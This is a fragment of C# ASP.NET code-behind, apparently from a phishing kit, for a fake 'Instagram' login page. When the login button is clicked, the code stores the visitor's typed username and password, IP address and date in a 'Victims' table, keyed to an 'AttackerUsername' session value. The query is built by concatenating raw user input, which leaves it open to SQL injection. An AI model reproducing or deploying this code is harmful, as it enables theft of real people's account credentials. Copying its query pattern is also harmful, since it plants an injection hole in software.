    ...
    public partial class Instagram : System.Web.UI.Page
    {
        ...
        protected void loginbtn_Click(object sender, EventArgs e)
        {
            if (Session["AttackerUsername"] != null)
            {
                ...
                string query = "insert into Victims(Username,Category,VictimUserName,Password,IPAddress,Date) values ('" + AttackerUsername + "','" + Category + "','" + emailid.Text + "','" + passwordtxt.Text + "','" + ipaddresses + "','" + todaydate + "')";
